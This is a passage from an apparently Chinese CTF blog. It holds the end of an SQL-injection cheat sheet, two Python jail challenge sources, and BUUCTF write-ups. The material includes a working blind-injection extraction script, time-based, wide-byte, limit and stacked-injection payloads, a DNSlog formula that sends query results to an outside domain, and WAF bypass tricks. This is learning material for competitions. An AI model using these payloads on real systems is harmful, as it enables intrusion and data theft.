          <span class="comment">#print(payloads)</span></span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">datas</span>(<span class="params">url,table</span>):  <span class="comment">#无列名盲注爆数据(可修改)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个数据，如：1,2等:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        y = x-<span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(y)</span><br><span class="line">        <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&quot;</span>+<span class="built_in">str</span>(x)+<span class="string">&quot;,&#123;&#125;,&#x27;&#x27;)&gt;(table &quot;</span>+table+<span class="string">&quot; limit &quot;</span>+num+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                hexchar = str2hex(name + <span class="built_in">chr</span>(char))</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">                <span class="comment">#print(payloads)</span></span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要操作的内容：\n1.爆当前数据库\n2.爆数据表开始行号\n3.爆数据表\n4.爆字段值开始行号\n5.爆字段值\n6.爆数据\n7.爆所有数据库&quot;</span>)</span><br><span class="line">        types = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> types == <span class="number">1</span>:</span><br><span class="line">            current_db(url)</span><br><span class="line">        <span class="keyword">elif</span> types == <span class="number">2</span> <span class="keyword">or</span> types == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入已经得到的数据库名:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            database = <span class="built_in">input</span>()</span><br><span class="line">            <span class="keyword">if</span> types == <span class="number">2</span>:</span><br><span class="line">                tables_n(url,database)</span><br><span class="line">            <span class="keyword">elif</span> types == <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;爆数据表开始行号:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">                tables(url,database,n)</span><br><span class="line">        <span class="keyword">elif</span> types == <span class="number">4</span> <span class="keyword">or</span> types == <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入已经得到的数据库名:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            database = <span class="built_in">input</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入已经得到的数据表名:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            table = <span class="built_in">input</span>()</span><br><span class="line">            <span class="keyword">if</span> types == <span class="number">4</span>:</span><br><span class="line">                columns_n(url,database,table)</span><br><span class="line">            <span class="keyword">elif</span> types == <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;爆字段值开始行号:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">                columns(url,database,table,n)</span><br><span class="line">        <span class="keyword">elif</span> types == <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入要查询的数据表名:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            table = <span class="built_in">input</span>()</span><br><span class="line">            datas(url,table)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dbs(url)</span><br></pre></td></tr></table></figure>
<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>原理都会，不讲了。</p>
<p>ascii判断:<code>if(ascii(substr(查询语句,1,1))&gt;115,1,sleep(3))</code><br>left语句判断:<code>if(left(查询语句,1)=&#39;s&#39;,sleep(10),1)</code><br>             <code>if(left(查询语句,2)=&#39;sa&#39;,sleep(10),1)</code><br>substring函数判断:<code>if(substring((查询语句),1,1=&#39;a&#39;),11111,sleep(1))</code></p>
<h1 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h1><p>同时间盲注，没啥东西</p>
<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>也没啥太多活能整，可以使用flask框架本地中转一下，把繁琐的步骤交给机器做。</p>
<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>能同时执行多条语句，要求比较高，这时候可以使用预编译了。<br>可以参考这题整花活**[强网杯 2019]随便注**<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/103239145">BUUCTF[强网杯 2019]随便注 的三种解法</a></p>
<h1 id="Dnslog注入"><a href="#Dnslog注入" class="headerlink" title="Dnslog注入"></a>Dnslog注入</h1><p>要求mysql权限比较高，同时还得能出网<br>公式:<code>select load_file(concat(&#39;\\&#39;,(查询语句),&#39;.DNSLOG给的域名/任意字符&#39;</code></p>
<h1 id="搜索注入"><a href="#搜索注入" class="headerlink" title="搜索注入"></a>搜索注入</h1><p>原理:mysql查询的时候，常用的是<code>select * from sqltest where names like &#39;%要查询的关键字%</code><br>这时候就可以闭合<code>%</code>然后注入</p>
<h1 id="宽字节注入-使用了addslashes-函数-amp-amp-数据库设置了编码模式为GBK"><a href="#宽字节注入-使用了addslashes-函数-amp-amp-数据库设置了编码模式为GBK" class="headerlink" title="宽字节注入 |使用了addslashes()函数 &amp;&amp; 数据库设置了编码模式为GBK"></a>宽字节注入 |使用了addslashes()函数 &amp;&amp; 数据库设置了编码模式为GBK</h1><p>原理: 前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=%df&#x27; and 1=1 --+</span><br><span class="line"></span><br><span class="line">?id=%df&#x27; and 1=2 --+</span><br><span class="line"></span><br><span class="line">?id=-1%df&#x27; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<h1 id="limit注入-数据库版本比较低"><a href="#limit注入-数据库版本比较低" class="headerlink" title="limit注入 | 数据库版本比较低"></a>limit注入 | 数据库版本比较低</h1><p>原理:<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法</a><br>公式:<code>SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,查询语句)),1); </code></p>
<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格,括号代替空格,注释<code>/*注释*/</code></p>
<h2 id="引号-十六进制"><a href="#引号-十六进制" class="headerlink" title="引号 | 十六进制"></a>引号 | 十六进制</h2><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。<code>users</code>的<strong>十六进制</strong>的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p>
<p>select column_name from information_schema.tables where table_name&#x3D;<code>0x7573657273</code></p>
<h2 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h2><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
<p><code>select substr(database() from 1 for 1);</code></p>
<p><code>select mid(database() from 1 for 1);</code></p>
<p>使用join：</p>
<p><code>union select 1,2#</code></p>
<p>等价于 <code>union select * from (select 1)a join (select 2)b</code></p>
<p>使用like:</p>
<p><code>select ascii(mid(user(),1,1))=80 #</code></p>
<p>等价于 <code>select user() like &#39;r%&#39;</code></p>
<p>对于limit可以使用offset来绕过：</p>
<p><code>select * from news limit 0,1 #</code></p>
<p>等价于下面这条SQL语句<code> select * from news limit 1 offset 0</code></p>
<h2 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号()"></a>绕过比较符号()</h2><p>（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</p>
<p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：</p>
<p><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></p>
<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<p><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p>
<h2 id="Between注入"><a href="#Between注入" class="headerlink" title="Between注入"></a>Between注入</h2><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p>
<p>注<code>between 1 and 1;</code> 等价于 &#x3D;1</p>
<h2 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h2><p>可以使用having ,但是<code>having</code>只能用前面<code>select</code>已经选择的列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select goods_price,goods_name from sw_goods where goods_price &gt; 100</span><br><span class="line">select goods_price,goods_name from sw_goods having goods_price &gt; 100</span><br></pre></td></tr></table></figure>
<h2 id="过滤information-schema"><a href="#过滤information-schema" class="headerlink" title="过滤information_schema"></a>过滤information_schema</h2><p>可以查表名:</p>
<ol>
<li>InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。只需要把<code>infromation_schema</code>换成<code>mysql.innodb_table_stats</code></li>
<li>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。只需要把<code>information_schema</code>换成<code>sys.schema_auto_increment_columns</code>就行了，其他的完全一样</li>
</ol>
<p>之后就需要无列名注入了</p>
<h2 id="SLEEP"><a href="#SLEEP" class="headerlink" title="SLEEP"></a>SLEEP</h2><p>睡不了？就想办法让sql干重活慢下来<br><code>concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;</code></p>
<h2 id="or-and-xor-not绕过："><a href="#or-and-xor-not绕过：" class="headerlink" title="or and xor not绕过："></a>or and xor not绕过：</h2><p><code>and=&amp;&amp;</code> <code>or=||</code> <code>xor=|</code> <code>not=!</code></p>
<h2 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h2><p>（#，–(后面跟一个空格））过滤：</p>
<p><code>id=1&#39; union select 1,2,3||&#39;1</code></p>
<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
<p><code>id=1&#39; union select 1,2,&#39;3</code></p>
<h2 id="绕过等于号"><a href="#绕过等于号" class="headerlink" title="绕过等于号"></a>绕过等于号</h2><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p>
<h2 id="其他的bypass手段"><a href="#其他的bypass手段" class="headerlink" title="其他的bypass手段:"></a>其他的bypass手段:</h2><p>这个就看题目环境了，题目里随机多样，但是万变不离其宗。</p>
<h1 id="Sqlmap科技"><a href="#Sqlmap科技" class="headerlink" title="Sqlmap科技"></a>Sqlmap科技</h1><p>未完待续</p>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接:"></a>相关链接:</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11610385.html#lab3">Sqli通关</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79847375">flask框架</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9849">exp函数溢出注入</a><br><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/03/25/MySQL%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">MySQL注入指北</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">group_by注入</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53065491/article/details/121893986">group_by报错注入</a><br><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/06/18/MySQL%E7%9A%84BIGINT%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">BIGINT报错注入</a><br><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/04/07/SQL%E6%B3%A8%E5%85%A5%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90-WooYun/#x00-%E5%BA%8F">SQL注入关联分析</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231627">浅谈利用mysql8新特性进行SQL注入</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46330722/article/details/109605941?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-109605941-blog-117067799.pc_relevant_vip_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-109605941-blog-117067799.pc_relevant_vip_default&utm_relevant_index=2">SQL注入之无列名注入</a></p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted index-categories" href="/categories/%E5%A4%87%E5%BF%98%E5%BD%95/">备忘录</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/SQL/">SQL</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/">备忘录</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-12  <a class="commentCountImg" href="/2022/10/12/HNctf/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 分钟  <i class="fas fa-pencil-alt"> </i>0.2 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/12/HNctf/"> </a></h1><div class="content"><h1 id="Week1-calc-jail-beginner-level2-5-JAIL"><a href="#Week1-calc-jail-beginner-level2-5-JAIL" class="headerlink" title="[Week1]calc_jail_beginner_level2.5(JAIL)"></a>[Week1]calc_jail_beginner_level2.5(JAIL)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#the length is be limited less than 13</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#banned some unintend sol</span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    BLACKLIST = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;eval&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ ___    _____ </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  </span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                          </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">filter</span>(input_data)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Unicode 欺骗<br><code>https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E6%9E%81%E7%AB%AF%E9%99%90%E5%88%B6</code><br>好棒的博客</p>
<h1 id="WEEK2-calc-jail-beginner-level5-JAIL"><a href="#WEEK2-calc-jail-beginner-level5-JAIL" class="headerlink" title="[WEEK2]calc_jail_beginner_level5(JAIL)"></a>[WEEK2]calc_jail_beginner_level5(JAIL)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#It\&#x27;s an challenge for jaillevel5 let\&#x27;s read your flag!\nimport load_flag\n\nflag = load_flag.get_flag()\n\ndef main():\n    WELCOME = \&#x27;\&#x27;\&#x27;\n  _                _                           _       _ _ _                _ _____ \n | |              (_)                         (_)     (_) | |              | | ____|\n | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  \n | \&#x27;_ \\ / _ \\/ _` | | \&#x27;_ \\| \&#x27;_ \\ / _ \\ \&#x27;__|   | |/ _` | | | |/ _ \\ \\ / / _ \\ |___ \\ \n | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\\ V /  __/ |___) |\n |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_|      | |\\__,_|_|_|_|\\___| \\_/ \\___|_|____/ \n              __/ |                          _/ |                                   \n             |___/                          |__/                                                                                                                                                                     \n\&#x27;\&#x27;\&#x27;\n    print(WELCOME)\n    print(&quot;It\&#x27;s so easy challenge!&quot;)\n    print(&quot;Seems flag into the dir()&quot;)\n    repl()\n\n\ndef repl():\n    my_global_dict = dict()\n    my_global_dict[\&#x27;my_flag\&#x27;] = flag\n    input_code = input(&quot;&gt; &quot;)\n    complie_code = compile(input_code, \&#x27;&lt;string&gt;\&#x27;, \&#x27;single\&#x27;)\n    exec(complie_code, my_global_dict)\n\nif __name__ == \&#x27;__main__\&#x27;:\n    main()</span><br></pre></td></tr></table></figure></div><div class="index-category-tag">  <hr></div></article></div><div class="card"><div class="card-image"><a class="image is-7by3" href="/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/"><img class="fill" src="/images/thumbnail/ji.png" alt="BUU做题寄录"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-10  <a class="commentCountImg" href="/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/#comment-container"><span class="display-none-class">8df068351002c6067f9baecf3268bc66</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="8df068351002c6067f9baecf3268bc66">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>17 分钟  <i class="fas fa-pencil-alt"> </i>2.6 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/">BUU做题寄录</a></h1><div class="content"><h1 id="suctf-2019-EasySQL-sql-mode"><a href="#suctf-2019-EasySQL-sql-mode" class="headerlink" title="[suctf 2019]EasySQL | sql_mode"></a>[suctf 2019]EasySQL | sql_mode</h1><p>sql 注入</p>
<p>乍一试，可以堆叠<br><img src="/images/ji/1.png"></p>
<p><img src="/images/ji/2.png"><br>看样子有过滤,简单测了一下，过滤了<code>from</code>,<code>information</code></p>
<p>黑名单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$BlackList</span> = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET[&#x27;query&#x27;] || flag from flag</span><br></pre></td></tr></table></figure>

<h2 id="脑洞"><a href="#脑洞" class="headerlink" title="脑洞:"></a>脑洞:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1: *,1</span><br><span class="line">payload2: 0;set sql_mode=PIPES_AS_CONCAT;select 0</span><br><span class="line"></span><br><span class="line">让sql把 || 当作拼接</span><br></pre></td></tr></table></figure>

<h1 id="强网杯-2019-随便注-堆叠，无select-预编译"><a href="#强网杯-2019-随便注-堆叠，无select-预编译" class="headerlink" title="[强网杯 2019]随便注 | 堆叠，无select 预编译"></a>[强网杯 2019]随便注 | 堆叠，无select 预编译</h1><p>上来就把黑名单一摆，好像已经无懈可击了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>测试一下，字符形 双引号<br><img src="/iamges/ji/3.png"><br>emmm,啥都不会了，只能看看<code>wp</code>了</p>
<p>mysql里面，爆字段并不一定需要<code>information_schema</code>这个库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show columns from users;</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field    | Type        | Null | Key | Default | Extra          |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id       | int(3)      | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| username | varchar(20) | NO   |     | NULL    |                |</span><br><span class="line">| password | varchar(20) | NO   |     | NULL    |                |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/iamges/ji/4.png"></p>
<p>嗯哼~<br><strong>how 命令查看表中的「字段」，注意表名要用反引号包裹</strong><br><a href="%22https://blog.csdn.net/qq_44657899/article/details/103239145%22">有用</a></p>
<p>附: MySQL专有无select可用<br>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p>
<p>也可以使用预编译转换成hex绕过</p>
<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>喜提fuzz脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = &quot;http://7e692c90-6f0b-4aa3-babf-89bb436f6b4f.node4.buuoj.cn:81/&quot;</span><br><span class="line">with open(&#x27;sql-fuzz.txt&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        data = &#123;&quot;query&quot;: line&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if(&#x27;Nonono&#x27; in r.text):</span><br><span class="line">            print(line.strip(),end=&quot; &quot;)</span><br></pre></td></tr></table></figure>

<p>纯盲注了，啥都看不见，但是我感觉这题的画风是那么的似曾相识…..</p>
<p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
<p>淦，上一题一模一样的<code>payload</code></p>
